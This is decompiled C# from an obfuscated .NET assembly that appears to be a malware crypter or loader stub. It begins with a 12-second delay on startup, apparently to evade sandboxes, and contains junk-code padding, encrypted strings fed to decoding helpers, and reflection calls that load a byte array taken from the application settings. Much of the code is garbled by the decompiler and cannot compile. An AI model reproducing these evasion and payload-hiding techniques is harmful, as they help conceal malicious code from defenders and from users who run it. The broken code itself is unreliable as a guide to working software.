using System;
using System.Collections.Generic;
using System.Globalization;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Security;
using System.Text;
using System.Threading;
using ns0;
using ns2;

namespace ns1;

public static class GClass0
{
	public static byte[] byte_0;

	public static AppDomain appDomain_0;

	public static Assembly assembly_0;

	[SecuritySafeCritical]
	static GClass0()
	{
		try
		{
			TimeSpan timeSpan = new TimeSpan(0, 0, 12);
			DateTime dateTime = DateTime.Now + timeSpan;
			while (DateTime.Now <= dateTime)
			{
				Thread.Sleep(1000);
			}
		}
		catch
		{
		}
	}

	[SecuritySafeCritical]
	public static void Main()
	{
		try
		{
			byte[] array = new byte[16];
			int num = 0;
			int num2 = 0;
			int num3 = ((array.Length - 4 - 0 + 1 - 1 > 255) ? 255 : (array.Length - 4 - num + 1 - 1));
			int num4 = ((num2 >> 12) ^ num2) & 0xFFF;
			byte b = (new byte[4096])[num4];
			int num5 = 0;
			int num6 = 0;
			appDomain_0 = Thread.GetDomain();
			int i = 0;
			Class2.smethod_1();
			int[,] array2 = new int[0, 0];
			for (; i < 16 && b > i; i++)
			{
				int num7 = array2[num4, i];
				if ((byte)num2 == array[num7] && (byte)(num2 >> 8) == array[num7 + 1] && (byte)(num2 >> 16) == array[num7 + 2] && num7 < num - 2)
				{
					int j;
					for (j = 3; array[num7 + j] == array[num + j] && j < num3; j++)
					{
					}
					if (j > num5 || (j == num5 && num7 > num6))
					{
						num6 = num7;
						num5 = j;
					}
				}
			}
		}
		catch
		{
		}
	}

	unsafe static void smethod_0(bool bool_0, byte byte_1, IntPtr intptr_0, object object_0, bool bool_1, byte byte_2, IntPtr intptr_1, object object_1, bool bool_2, byte byte_3, IntPtr intptr_2, object object_2)
	{
		//IL_003e: Expected O, but got I4
		//IL_0066: Expected O, but got I4
		//IL_0070: Expected O, but got I4
		//IL_00c1: Expected O, but got I4
		//IL_00eb: Expected O, but got I4
		//IL_00fb: Expected O, but got I4
		//IL_0105: Expected O, but got I4
		//IL_0118: Unknown result type (might be due to invalid IL or missing references)
		//IL_011e: Expected I4, but got Unknown
		//IL_011f: Expected O, but got I4
		//IL_018a: Expected O, but got I4
		//IL_019e: Unknown result type (might be due to invalid IL or missing references)
		//IL_01af: Expected Ref, but got Unknown
		//IL_01c6: Expected O, but got I4
		//IL_01d6: Expected O, but got I4
		//IL_01fb: Expected O, but got I4
		//IL_022b: Expected O, but got I4
		//IL_0242: Expected O, but got I4
		//IL_025f: Expected O, but got I4
		//IL_0265: Expected I4, but got O
		//IL_0280: Expected O, but got I4
		//IL_0294: Expected O, but got I4
		//IL_02a8: Expected O, but got I4
		//IL_02ba: Expected O, but got I4
		//IL_0316: Expected O, but got I4
		//IL_034c: Expected O, but got I4
		//IL_036e: Expected O, but got I4
		//IL_037c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0382: Expected I8, but got Unknown
		//IL_0383: Expected O, but got I4
		//IL_039c: Expected I4, but got O
		//IL_03b6: Expected O, but got I8
		//IL_03c0: Expected O, but got I4
		//IL_03d6: Expected O, but got I4
		//IL_03f9: Expected O, but got I
		//IL_0424: Expected O, but got I4
		//IL_043f: Expected O, but got I
		//IL_0449: Expected O, but got I4
		//IL_044d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0453: Expected Ref, but got Unknown
		//IL_0454: Expected O, but got I4
		//IL_045d: Expected I4, but got O
		//IL_045e: Expected O, but got I4
		//IL_0472: Expected O, but got I4
		//IL_0492: Expected O, but got I4
		//IL_04e4: Expected O, but got I
		//IL_04e8: Unknown result type (might be due to invalid IL or missing references)
		//IL_04f3: Unknown result type (might be due to invalid IL or missing references)
		//IL_04f6: Expected I4, but got Unknown
		//IL_0510: Expected O, but got I4
		//IL_0515: Unknown result type (might be due to invalid IL or missing references)
		//IL_0518: Expected I4, but got Unknown
		//IL_0545: Expected O, but got I4
		//IL_054e: Expected I4, but got O
		//IL_054f: Expected O, but got I
		//IL_0555: Unknown result type (might be due to invalid IL or missing references)
		//IL_0575: Expected O, but got I4
		//IL_0579: Unknown result type (might be due to invalid IL or missing references)
		//IL_057a: Unknown result type (might be due to invalid IL or missing references)
		//IL_057d: Expected I8, but got Unknown
		//IL_058d: Expected O, but got I4
		//IL_059c: Expected O, but got I4
		//IL_05b6: Expected O, but got I4
		//IL_05c0: Expected O, but got I4
		//IL_0615: Expected O, but got I4
		//IL_0679: Expected O, but got F8
		//IL_06aa: Expected O, but got I4
		//IL_06b3: Expected I, but got O
		//IL_06b4: Expected O, but got I
		//IL_06c1: Unknown result type (might be due to invalid IL or missing references)
		//IL_06cc: Expected Ref, but got Unknown
		try
		{
			IntPtr intPtr = (IntPtr)Class1.smethod_0((byte[])(object)Settings.Default, null);
			IntPtr intPtr2 = default(IntPtr);
			intPtr2 = intPtr;
		}
		catch
		{
			object obj = ((uint*)(uint)Class5.smethod_2())->Equals(Class0.smethod_0());
			Class3 obj2 = (Class3)(object)((ulong*)((obj is ulong) ? obj : null))->ToString((string)(object)Settings.Default);
			Class3 @class = @class;
			System.Runtime.CompilerServices.Unsafe.SkipInit(out Class3 class2);
			@class = class2;
			@class = obj2;
		}
		System.Runtime.CompilerServices.Unsafe.SkipInit(out NumberStyles numberStyles);
		System.Runtime.CompilerServices.Unsafe.SkipInit(out string text);
		object obj4 = uint.Parse(text, numberStyles);
		_ = ((ushort*)((obj4 is ushort) ? obj4 : null))->GetTypeCode() is string;
		text = text;
		System.Runtime.CompilerServices.Unsafe.SkipInit(out ushort num);
		System.Runtime.CompilerServices.Unsafe.SkipInit(out _003CPrivateImplementationDetails_003E _003CPrivateImplementationDetails_003E);
		System.Runtime.CompilerServices.Unsafe.SkipInit(out ref ulong reference2);
		byte[] byte_4;
		System.Runtime.CompilerServices.Unsafe.SkipInit(out object obj5);
		while (true)
		{
			object obj6 = ((uint*)289438228)->CompareTo(obj5);
			object obj7 = ((obj6 is bool) ? obj6 : null);
			num = num;
			ref _003F reference = ref *(_003F*)obj7;
			object obj8 = sbyte.Parse(((ushort*)num)->GetHashCode() as string);
			if (!(System.Runtime.CompilerServices.Unsafe.As<_003F, bool>(ref reference).CompareTo((byte)checked(((obj8 is bool) ? obj8 : null) * (unchecked((byte)Class1.smethod_2("15pWgT1pLf70CdHNe0M7TvW+QRS4U7zyvcCx4jInjwuPMrc330tt9KxU0cxywka4TCqeUq1Joz++byScjJPA")) != 0)) != 0) is bool))
			{
				break;
			}
			Class3 @class = null;
			_ = (byte[])(object)"z3E/2wCgztoNz9yjQhLhzpJxj9lS/HLmoqMCWQ71HJNSpHW8Zwe3pSRU3/CUB8+2dT/xPJxxFsZcxTXkdqVw".Substring((int)"C2HQKWeHk7AINv9l8mTE7F0n3MHDH2m7ZJ0nR2uXBqIZNaZldMvJiyHBhwCSC81wAKs9Cl3ZeDd6cvUOcrh6".ToLower());
			byte_4 = null;
			_003CPrivateImplementationDetails_003E obj9 = (_003CPrivateImplementationDetails_003E)(object)Class1.smethod_0(byte_4, Class0.smethod_0());
			_003CPrivateImplementationDetails_003E = _003CPrivateImplementationDetails_003E;
			_003CPrivateImplementationDetails_003E = obj9;
			string s = text;
			reference2 = ref reference2;
			_ = ulong.TryParse(s, out reference2) is Settings;
			Struct3 @struct = default(Struct3);
			@struct = default(Struct3);
		}
		sbyte b2;
		System.Runtime.CompilerServices.Unsafe.SkipInit(out bool flag);
		System.Runtime.CompilerServices.Unsafe.SkipInit(out ulong num4);
		System.Runtime.CompilerServices.Unsafe.SkipInit(out IFormatProvider formatProvider);
		System.Runtime.CompilerServices.Unsafe.SkipInit(out int num2);
		System.Runtime.CompilerServices.Unsafe.SkipInit(out BindingFlags bindingFlags);
		Type[] array;
		try
		{
			num2 = (int)((uint)num2 / (uint)num2);
			int num3 = num2;
			text = "kf45pX+1DTuM4zzCoIKO+jvu5tdnS+wuF99cYMNIHebIG8dEmmY2ncQvbY++fHkByeQ7m7NPk5b0CZDJ42Zn";
			System.Runtime.CompilerServices.Unsafe.SkipInit(out string text2);
			_ = (IntPtr)((int*)num3)->ToString(text2, null);
		}
		catch
		{
			System.Runtime.CompilerServices.Unsafe.SkipInit(out byte b);
			System.Runtime.CompilerServices.Unsafe.SkipInit(out PropertyInfo[] propertyInfo_);
			System.Runtime.CompilerServices.Unsafe.SkipInit(out sbyte b3);
			System.Runtime.CompilerServices.Unsafe.SkipInit(out string text4);
			System.Runtime.CompilerServices.Unsafe.SkipInit(out Type[] type_3);
			do
			{
				b = b;
				string text3 = ((byte*)b)->ToString();
				string s2 = (string)(object)Class0.smethod_0();
				numberStyles = numberStyles;
				object obj10 = short.TryParse(s2, default(NumberStyles), (IFormatProvider)(object)Settings.Default, out *(short*)Class1.smethod_2(text));
				object obj11 = ((obj10 is ulong) ? obj10 : null);
				num4 = num4;
				NormalizationForm normalizationForm = (NormalizationForm)((ulong*)checked(obj11 * (num4 + 1295690274uL)))->ToString(text, (IFormatProvider)(object)Class0.smethod_0());
				_ = text3.IsNormalized(default(NormalizationForm)) is Class5;
				_ = ((short*)27951)->GetHashCode() is Resources;
				string s3 = text;
				BindingFlags bindingFlags_ = bindingFlags;
				_ = (PropertyInfo[])(object)Class0.smethod_0();
				Type type_ = ((uint*)1510779322)->CompareTo(873554815u) as Type;
				array = null;
				sbyte num5 = (sbyte)Class2.smethod_2(bindingFlags_, propertyInfo_, type_, array, null);
				text = text;
				BindingFlags bindingFlags_2 = bindingFlags;
				_ = ((sbyte*)(sbyte)Class1.smethod_2("zZHB5x54F2xCaJoUqEo8oeOJiOF24K3QjGCpexLqbr3vU153HZb/wgRem6DksmrFYVJmL8dDyksM4px9lZEi"))->GetTypeCode() is Type;
				Type type_2 = ((ushort*)checked(10745u - 52235u))->Equals(num) as Type;
				array = array;
				uint num6 = checked((flag ? 1u : 0u) + 0u);
				flag = (byte)num6 != 0;
				object obj12 = ((bool*)num6)->CompareTo(null);
				b2 = (sbyte)(int)((obj12 is sbyte) ? obj12 : null);
				b2 = b3;
				_ = ushort.Parse(s3, (NumberStyles)((sbyte*)num5)->ToString(text4, char.IsSymbol((char)Class2.smethod_2(bindingFlags_2, null, type_2, type_3, ((sbyte*)b2)->CompareTo(((ushort*)10400)->ToString()) as ParameterModifier[])) as IFormatProvider)) is Class1;
				_ = ((uint*)703183959)->Equals(obj5) is uint;
			}
			while ((byte)Class0.smethod_0() != 0);
		}
		finally
		{
			System.Runtime.CompilerServices.Unsafe.SkipInit(out string text5);
			while (true)
			{
				text = text;
				formatProvider = formatProvider;
				num2 = (int)((ulong*)851008846L)->ToString(text5, formatProvider);
			}
		}
		IL_0636:
		NumberStyles style = numberStyles;
		ref uint reference3 = ref reference3;
		if (checked(0u - ((uint.TryParse("snkoN7f2Os7YBJYdm5bIoNHKeLAGUT5s7yC99qBuksqWxjup20bplWcJ7sNgwRHnLczA3n6qBNRLtkvJSbg+", style, null, out reference3) ? 1u : 0u) - 0u)) != 0)
		{
			goto IL_068f;
		}
		goto IL_064f;
		IL_064f:
		char c;
		try
		{
			try
			{
				Settings settings = settings;
				return;
			}
			finally
			{
				c = (char)Class0.smethod_0();
				return;
			}
		}
		catch
		{
			_ = char.GetNumericValue((char)(text + text)) is Class0;
			return;
		}
		IL_068f:
		text = text;
		string text6;
		string s4 = text6;
		numberStyles = default(NumberStyles);
		ref _003F reference4 = ref *(_003F*)(-127);
		object obj15 = (nint)(IntPtr)(void*)(nint)/*isinst with value type is only supported in some contexts*/;
		if ((byte)System.Runtime.CompilerServices.Unsafe.As<_003F, sbyte>(ref reference4).ToString((IFormatProvider)(object)((long*)checked(((obj15 is long) ? obj15 : null) + 467147284L))->ToString("ZCywdwDC57obHxR5PtnjuLu0OgLcT7hiiKJnXElLjeb+yHKDy6OYgprjkn8LfbWb2h6nmgyjiTeWLpxZVvF1")) != 0)
		{
			goto IL_0680;
		}
		goto IL_068f;
		IL_0680:
		Class0 class3 = class3;
		class3 = class3;
		class3 = class3;
		goto IL_068f;
		IL_0498:
		Class5 obj16 = (Class5)(object)Class0.smethod_0();
		Class5 class4 = class4;
		class4 = obj16;
		if ((byte)((sbyte*)b2)->ToString() != 0)
		{
			goto IL_0498;
		}
		goto IL_04b6;
		IL_04b6:
		uint num7 = (flag ? 1u : 0u) / checked(0u + (flag ? 1u : 0u) - (unchecked((((byte)((int*)1815073963)->ToString(text) != 0) ? 1u : 0u) / 0u) - 1u));
		object obj17 = (nint)((IntPtr)Settings.Default - num2);
		flag = (byte)(int)checked(num7 * ((obj17 is bool) ? obj17 : null) * (unchecked((byte)Settings.Default) != 0)) != 0;
		c = (char)Class1.smethod_0(byte_4, byte_4);
		char highSurrogate;
		object obj18 = char.ConvertToUtf32(highSurrogate, c);
		flag = (byte)checked(((obj18 is bool) ? obj18 : null) + 0) != 0;
		uint num8;
		checked
		{
			bool flag2;
			num8 = ((flag2 ? 1u : 0u) - unchecked((flag ? 1u : 0u) / 0u)) * 0u;
		}
		object obj19 = ((ulong*)checked(1617582814uL - 558146902uL * unchecked((ulong)Settings.Default)))->GetTypeCode();
		object obj20 = (nint)(IntPtr)(int)((obj19 is int) ? obj19 : null);
		_003F val = checked(((obj20 is ulong) ? obj20 : null) + num4);
		ulong num9 = (ulong)Class1.smethod_2(text);
		obj5 = null;
		object obj21;
		obj5 = obj21;
		object value;
		object obj22 = ((ushort*)11231)->CompareTo(value);
		num4 = (ulong)(long)(val / checked(num9 - ((obj22 is ulong) ? obj22 : null)));
		ulong num10;
		ulong num11 = num10;
		object obj23 = byte.Parse(text, numberStyles);
		object obj24 = ((obj23 is long) ? obj23 : null);
		long.Parse(short.Parse(text, numberStyles, formatProvider) as string, null);
		checked
		{
			if (num8 + ((unchecked((byte)((ulong*)num11)->ToString(((ushort*)36944)->Equals(((long*)obj24)->CompareTo(-230156475L) as object) as IFormatProvider)) != 0) ? 1u : 0u) != 0)
			{
				goto IL_0636;
			}
			goto IL_05d1;
		}
		IL_05d1:
		num2 = -1777029556;
		bindingFlags = default(BindingFlags);
		bindingFlags = bindingFlags;
		BindingFlags bindingFlags2 = default(BindingFlags);
		bindingFlags = bindingFlags2;
		BindingFlags bindingFlags3 = default(BindingFlags);
		BindingFlags bindingFlags_3 = bindingFlags3;
		PropertyInfo[] propertyInfo_2 = (PropertyInfo[])(object)Class5.smethod_0(text);
		Type type_4 = ((short*)11357)->Equals(-8679) as Type;
		array = null;
		Type[] type_5;
		ParameterModifier[] parameterModifier_;
		_ = (int)Class1.smethod_3(bindingFlags_3, propertyInfo_2, type_4, type_5, parameterModifier_);
		_ = (short)Class0.smethod_0();
		goto IL_0636;
	}

	unsafe static void smethod_1(bool bool_0, byte byte_1, IntPtr intptr_0, object object_0, bool bool_1, byte byte_2, IntPtr intptr_1, object object_1, bool bool_2, byte byte_3, IntPtr intptr_2, object object_2)
	{
		//IL_0011: Expected O, but got I4
		//IL_002a: Expected O, but got I4
		//IL_0045: Expected O, but got I4
		//IL_0051: Expected O, but got I4
		//IL_0057: Expected I4, but got O
		//IL_0063: Expected O, but got I4
		//IL_0075: Unknown result type (might be due to invalid IL or missing references)
		//IL_0078: Expected I8, but got Unknown
		//IL_00aa: Expected O, but got I4
		//IL_00b8: Expected O, but got I4
		//IL_00de: Expected O, but got I4
		//IL_00f1: Expected O, but got I8
		//IL_00fd: Expected I4, but got O
		//IL_012a: Expected O, but got I4
		//IL_0145: Expected O, but got I4
		//IL_016b: Expected O, but got I
		//IL_0170: Expected I4, but got O
		//IL_017a: Expected O, but got I4
		//IL_01a0: Expected O, but got I4
		//IL_01d3: Expected O, but got I4
		//IL_01e3: Expected O, but got I4
		//IL_0219: Expected O, but got I4
		//IL_0223: Expected O, but got I4
		//IL_0229: Unknown result type (might be due to invalid IL or missing references)
		//IL_023a: Expected O, but got I4
		//IL_023e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0244: Expected Ref, but got Unknown
		//IL_0245: Expected O, but got I4
		//IL_025c: Expected O, but got I4
		//IL_02d0: Expected O, but got I
		//IL_02d9: Expected I4, but got O
		//IL_02da: Expected O, but got I4
		//IL_0313: Expected O, but got I4
		//IL_0321: Expected O, but got I4
		//IL_0327: Expected I4, but got O
		//IL_0362: Expected O, but got I4
		//IL_0366: Unknown result type (might be due to invalid IL or missing references)
		//IL_0369: Expected I4, but got Unknown
		//IL_0373: Expected O, but got I4
		//IL_039c: Expected O, but got I4
		//IL_03a5: Expected I4, but got O
		//IL_03a6: Expected O, but got I4
		//IL_03aa: Unknown result type (might be due to invalid IL or missing references)
		//IL_03b0: Expected Ref, but got Unknown
		//IL_040c: Expected O, but got I4
		//IL_0487: Expected O, but got I8
		//IL_048b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0496: Unknown result type (might be due to invalid IL or missing references)
		//IL_04af: Unknown result type (might be due to invalid IL or missing references)
		//IL_04b0: Unknown result type (might be due to invalid IL or missing references)
		//IL_04d4: Expected O, but got I4
		//IL_04d8: Unknown result type (might be due to invalid IL or missing references)
		//IL_04e9: Expected O, but got I4
		//IL_0503: Expected O, but got I4
		//IL_0533: Expected O, but got I4
		//IL_053d: Expected O, but got I4
		//IL_0541: Unknown result type (might be due to invalid IL or missing references)
		//IL_0548: Expected Ref, but got Unknown
		//IL_0559: Expected O, but got I4
		//IL_0564: Expected I4, but got O
		//IL_0571: Expected O, but got I4
		//IL_058b: Expected Ref, but got Unknown
		//IL_058c: Expected O, but got I4
		//IL_0595: Expected Ref, but got Unknown
		//IL_05c4: Expected O, but got I4
		//IL_05e2: Expected O, but got I4
		//IL_0602: Expected O, but got I4
		//IL_0627: Expected O, but got I4
		//IL_0648: Expected O, but got I4
		//IL_0657: Expected O, but got I4
		//IL_0699: Expected O, but got I4
		//IL_06a2: Expected I4, but got O
		//IL_06b2: Expected O, but got I
		//IL_06c6: Expected O, but got I4
		//IL_06df: Expected O, but got I4
		//IL_0701: Expected I4, but got O
		//IL_0702: Expected O, but got I4
		//IL_070b: Expected I4, but got O
		//IL_070c: Expected O, but got I4
		//IL_0710: Unknown result type (might be due to invalid IL or missing references)
		//IL_071b: Expected Ref, but got Unknown
		//IL_071c: Expected O, but got I4
		//IL_0734: Expected O, but got I
		//IL_0742: Expected O, but got I4
		//IL_074b: Unknown result type (might be due to invalid IL or missing references)
		//IL_074e: Expected I4, but got Unknown
		//IL_0757: Expected O, but got I4
		//IL_0786: Expected O, but got I4
		//IL_0790: Expected O, but got I4
		//IL_0799: Unknown result type (might be due to invalid IL or missing references)
		//IL_0810: Expected O, but got I4
		//IL_0814: Unknown result type (might be due to invalid IL or missing references)
		//IL_081a: Expected I, but got Unknown
		//IL_081b: Expected O, but got I8
		//IL_0839: Expected O, but got I
		//IL_0863: Expected O, but got I4
		//IL_08c1: Expected O, but got I4
		//IL_0905: Expected O, but got I8
		//IL_090b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0911: Expected Ref, but got Unknown
		//IL_0912: Expected O, but got I
		//IL_0940: Expected O, but got I4
		//IL_0964: Expected O, but got I4
		//IL_0970: Expected O, but got I4
		System.Runtime.CompilerServices.Unsafe.SkipInit(out uint num);
		object obj = ((uint*)num)->Equals(null);
		object obj2 = ((obj is long) ? obj : null);
		NumberStyles numberStyles = default(NumberStyles);
		NumberStyles style = numberStyles;
		System.Runtime.CompilerServices.Unsafe.SkipInit(out string text);
		IFormatProvider provider = bool.Parse(text) as IFormatProvider;
		_ = ref *(ushort*)Class5.smethod_3();
		ref ushort reference = ref reference;
		System.Runtime.CompilerServices.Unsafe.SkipInit(out ref ushort result);
		System.Runtime.CompilerServices.Unsafe.SkipInit(out IFormatProvider formatProvider);
		object obj3 = byte.Parse(ushort.TryParse("FW+lxYVS2iVmgPkwzkjCXOr+Rk7+2kdX97vV8YuaIjxayFxdUJjUFGhVsfO2gocr2AKzWv6I79ENgwcDaPyo", style, provider, out result) as string, formatProvider);
		BindingFlags bindingFlags = (BindingFlags)((obj3 is BindingFlags) ? obj3 : null);
		System.Runtime.CompilerServices.Unsafe.SkipInit(out PropertyInfo[] propertyInfo_);
		System.Runtime.CompilerServices.Unsafe.SkipInit(out Type[] array);
		long num2;
		System.Runtime.CompilerServices.Unsafe.SkipInit(out ParameterModifier[] parameterModifier_);
		checked
		{
			System.Runtime.CompilerServices.Unsafe.SkipInit(out BindingFlags bindingFlags_);
			num2 = obj2 + unchecked((long)Class2.smethod_2(bindingFlags_, propertyInfo_, byte.Parse(text, null) as Type, array, parameterModifier_));
			num2 = 89705817L;
		}
		System.Runtime.CompilerServices.Unsafe.SkipInit(out nint num3);
		System.Runtime.CompilerServices.Unsafe.SkipInit(out Type type);
		System.Runtime.CompilerServices.Unsafe.SkipInit(out object obj7);
		System.Runtime.CompilerServices.Unsafe.SkipInit(out bool flag);
		if (!flag)
		{
			try
			{
				num3 = default(IntPtr);
				nint num4 = num3;
				num3 = default(IntPtr);
				num3 = (nint)checked(unchecked((nuint)num4) * unchecked((nuint)num3));
			}
			catch
			{
				try
				{
					object obj4 = ((bool*)1)->GetHashCode();
					_ = bool.TryParse("Bh29Avhnq73I6tY7Sdan/EZ0okqJZFLlbOFWX3k+myIvuaTZJ+6eR5iwn9Udki4ItRfP3TPyUd+h5IB1riAe", out *(bool*)((obj4 is ref bool) ? obj4 : null)) is _003CModule_003E;
				}
				finally
				{
					bindingFlags = default(BindingFlags);
					BindingFlags bindingFlags_2 = bindingFlags;
					object obj5 = ((bool*)1)->GetTypeCode();
					System.Runtime.CompilerServices.Unsafe.SkipInit(out ref long result2);
					_ = long.TryParse((string)(object)Class2.smethod_2(bindingFlags_2, (PropertyInfo[])(object)Class1.smethod_3((BindingFlags)((obj5 is BindingFlags) ? obj5 : null), propertyInfo_, ulong.Parse("WxFaGUquhZnWYuMkRfYVGDB7pIMuuTv5Ys2EffaI+UrQMkd3UYIPt6JC7buwANYGmxde3oo37LJmZAUL1tLU", formatProvider) as Type, null, parameterModifier_), type, (Type[])(object)Class1.smethod_2("U9Zuiu/AwXC0OBASrQJ6EyY5UnaBGypVBCGic68F0IzfdHrvhlxSWLbgQb0OK+Dju0D2dgkDLb42X+VHG35i"), null), out result2) is Type;
					string s = text;
					numberStyles = default(NumberStyles);
					System.Runtime.CompilerServices.Unsafe.SkipInit(out ref sbyte result3);
					type = sbyte.TryParse(s, numberStyles, null, out result3) as Type;
					num2 = num2;
					System.Runtime.CompilerServices.Unsafe.SkipInit(out long num5);
					num2 = (long)checked(unchecked((ulong)num5) - 18446744072023283677uL);
					System.Runtime.CompilerServices.Unsafe.SkipInit(out long num6);
					object obj6 = (nint)(IntPtr)(long)((ulong)num6 / (ulong)num2);
					num = (uint)(int)((obj6 is uint) ? obj6 : null);
					System.Runtime.CompilerServices.Unsafe.SkipInit(out uint num7);
					text = ((uint*)num7)->Equals(obj7) as string;
					System.Runtime.CompilerServices.Unsafe.SkipInit(out Type type_);
					System.Runtime.CompilerServices.Unsafe.SkipInit(out string string_);
					System.Runtime.CompilerServices.Unsafe.SkipInit(out ushort num8);
					_ = (uint)Class2.smethod_2(default(BindingFlags), null, type_, (Type[])(object)((ushort*)(ushort)Class5.smethod_1(string_))->ToString(((ushort*)checked(num8 + unchecked((ushort)Class0.smethod_0())))->CompareTo(obj7) as string, formatProvider), parameterModifier_);
					goto end_IL_009d;
				}
				end_IL_009d:;
			}
		}
		else
		{
			do
			{
				if (!(((bool*)null)->CompareTo(flag) is bool))
				{
					_ = ((ushort*)40281)->CompareTo(null) is ushort;
				}
			}
			while (flag);
		}
		System.Runtime.CompilerServices.Unsafe.SkipInit(out char c);
		System.Runtime.CompilerServices.Unsafe.SkipInit(out MethodBase[] array2);
		System.Runtime.CompilerServices.Unsafe.SkipInit(out Class2 @class);
		try
		{
			flag = true;
			System.Runtime.CompilerServices.Unsafe.SkipInit(out bool flag2);
			if (!flag2)
			{
				System.Runtime.CompilerServices.Unsafe.SkipInit(out BindingFlags bindingFlags_3);
				System.Runtime.CompilerServices.Unsafe.SkipInit(out char c2);
				System.Runtime.CompilerServices.Unsafe.SkipInit(out sbyte b2);
				System.Runtime.CompilerServices.Unsafe.SkipInit(out ref bool result4);
				System.Runtime.CompilerServices.Unsafe.SkipInit(out sbyte b3);
				System.Runtime.CompilerServices.Unsafe.SkipInit(out int num9);
				System.Runtime.CompilerServices.Unsafe.SkipInit(out int num15);
				System.Runtime.CompilerServices.Unsafe.SkipInit(out IFormatProvider formatProvider2);
				System.Runtime.CompilerServices.Unsafe.SkipInit(out ref int result6);
				System.Runtime.CompilerServices.Unsafe.SkipInit(out byte b);
				System.Runtime.CompilerServices.Unsafe.SkipInit(out byte b4);
				System.Runtime.CompilerServices.Unsafe.SkipInit(out byte b5);
				System.Runtime.CompilerServices.Unsafe.SkipInit(out string text3);
				System.Runtime.CompilerServices.Unsafe.SkipInit(out Type[] type_5);
				System.Runtime.CompilerServices.Unsafe.SkipInit(out ushort num24);
				System.Runtime.CompilerServices.Unsafe.SkipInit(out ushort num25);
				System.Runtime.CompilerServices.Unsafe.SkipInit(out ulong num26);
				System.Runtime.CompilerServices.Unsafe.SkipInit(out short num29);
				System.Runtime.CompilerServices.Unsafe.SkipInit(out string text4);
				System.Runtime.CompilerServices.Unsafe.SkipInit(out IFormatProvider formatProvider3);
				System.Runtime.CompilerServices.Unsafe.SkipInit(out byte[] byte_5);
				System.Runtime.CompilerServices.Unsafe.SkipInit(out long num31);
				System.Runtime.CompilerServices.Unsafe.SkipInit(out string text5);
				System.Runtime.CompilerServices.Unsafe.SkipInit(out byte b6);
				object obj22;
				bool num32;
				System.Runtime.CompilerServices.Unsafe.SkipInit(out ref sbyte result7);
				System.Runtime.CompilerServices.Unsafe.SkipInit(out ref byte reference3);
				System.Runtime.CompilerServices.Unsafe.SkipInit(out ref byte result8);
				System.Runtime.CompilerServices.Unsafe.SkipInit(out void* ptr);
				System.Runtime.CompilerServices.Unsafe.SkipInit(out ref byte result9);
				System.Runtime.CompilerServices.Unsafe.SkipInit(out short num34);
				System.Runtime.CompilerServices.Unsafe.SkipInit(out ParameterModifier[] array3);
				NumberStyles style5;
				System.Runtime.CompilerServices.Unsafe.SkipInit(out BindingFlags bindingFlags_7);
				System.Runtime.CompilerServices.Unsafe.SkipInit(out Type[] type_6);
				System.Runtime.CompilerServices.Unsafe.SkipInit(out ParameterModifier[] parameterModifier_2);
				System.Runtime.CompilerServices.Unsafe.SkipInit(out uint num35);
				do
				{
					bindingFlags = bindingFlags;
					Type type_2 = (Type)(object)((byte*)b)->ToString(formatProvider);
					Type[] type_3 = array;
					_003F val = checked(/*isinst with value type is only supported in some contexts*/ * flag);
					object obj9 = ((char*)(ushort)(char)Settings.Default)->GetHashCode();
					_ = (string)(object)Class2.smethod_2(bindingFlags_3, null, type_2, type_3, ((bool*)(val / ((obj9 is bool) ? obj9 : null)))->GetHashCode() as ParameterModifier[]);
					object obj10 = (flag ? ((bool*)1) : ((bool*)null))->GetHashCode();
					_ = (ushort)((short*)((obj10 is short) ? obj10 : null))->ToString(text, formatProvider);
					bindingFlags = (BindingFlags)Class5.smethod_1("fbpoYf+q5HkjFnW64Vtu05bwCYg+PHN6JMC4ItV5HeqZjkkGAdSI1UxkSYrpMrlJy1mgMadE+olnpruWrUDc");
					_ = (byte)Class1.smethod_3(default(BindingFlags), propertyInfo_, type, array, (ParameterModifier[])(object)Class0.smethod_0());
					b = (byte)((uint*)1122214033)->ToString(text, formatProvider);
					ref _003F reference2 = ref *(_003F*)num9;
					object obj11 = (nint)IntPtr.Add(num3, -1415363713);
					byte num10 = (byte)System.Runtime.CompilerServices.Unsafe.As<_003F, int>(ref reference2).ToString(char.IsWhiteSpace("Cxghs6BM3A6IjX5Kn2R5A1zQeZyXpobe6d4l8gYl1I3LIaoOS3tAuYofKIMPu+yrXhgOWVjnG3dFMPzOhVtr", (int)((obj11 is int) ? obj11 : null)) as string, formatProvider);
					byte num11 = (byte)Class0.smethod_0();
					string s2 = (string)(object)Class5.smethod_3();
					object obj12 = int.Parse(text);
					object obj13 = ((obj12 is byte) ? obj12 : null);
					string text2 = text;
					object obj14 = byte.TryParse(text, out reference3);
					c = (char)(int)((obj14 is char) ? obj14 : null);
					uint num12;
					checked
					{
						num12 = unchecked((uint)(sbyte)((char*)checked(c2 - (unchecked((uint)c) - 48377u)))->ToString(null)) * (unchecked((uint)b2) * unchecked((uint)b2)) + 11u;
					}
					ref bool reference4 = ref *(bool*)Settings.Default;
					object obj15 = bool.TryParse("K6o6xNpk0l3s90M0MtbE73+l47OcZhzvMyaJEaYwD4LtObM6Kx72Ht5T0Zn6gqiIy+Rl4A6Mqg5E9G+BtV+x", out result4);
					b2 = (sbyte)(int)(num12 / ((obj15 is sbyte) ? obj15 : null));
					int num13 = (int)((byte*)obj13)->ToString(text2, ((sbyte*)b3)->Equals(obj7) as IFormatProvider);
					num9 = (int)checked(2137261291u - unchecked((uint)num9));
					object obj16 = char.IsWhiteSpace(s2, (int)/*isinst with value type is only supported in some contexts*/);
					_ = (int)((long*)checked(-469891659L + ((obj16 is long) ? obj16 : null)))->ToString();
					uint num17;
					string s3;
					NumberStyles style2;
					IFormatProvider provider2;
					checked
					{
						_ = unchecked((uint)num9) - unchecked((uint)(int)Settings.Default);
						num9 = num9;
						uint num16 = 4140704973u - unchecked((uint)num15);
						formatProvider = null;
						num17 = num10 - (unchecked((uint)(num11 / (byte)((int*)num16)->ToString(formatProvider2))) + unchecked((uint)b));
						s3 = text;
						style2 = numberStyles;
						provider2 = formatProvider;
					}
					ref int result5 = ref *(int*)((long*)(-406542790L))->ToString((string)(object)Class0.smethod_0(), formatProvider);
					byte num18 = (byte)Class1.smethod_2(int.TryParse(s3, style2, provider2, out result6) as string);
					b = 26;
					b = (byte)(num18 / b4);
					uint num19 = checked(num17 * b5);
					long num20 = num2;
					long num21 = num2;
